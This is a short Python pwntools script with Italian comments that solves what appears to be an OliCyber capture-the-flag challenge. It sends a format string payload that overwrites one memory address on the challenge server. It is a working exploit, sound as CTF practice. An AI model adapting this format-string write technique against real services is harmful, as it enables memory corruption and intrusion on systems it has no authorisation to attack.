from pwn import *

# Imposta il contesto per evitare errori di architettura
context.arch = 'amd64'

# Avvia il processo
io = remote('formatted.challs.olicyber.it', 10305)

target_addr = 0x40404c
value_to_write = 10
offset = 6


payload = fmtstr_payload(offset, {target_addr: value_to_write})

# Debug: vediamo come è fatto il payload
print(f"Payload generato: {payload}")

# Invia
io.sendline(payload)

# Leggi l'output per vedere se hai vinto
try:
    print(io.recvall(timeout=1).decode(errors='ignore'))
except EOFError:
    print("\n[!] Il server è crashato ancora. Controlla l'offset!")

io.close()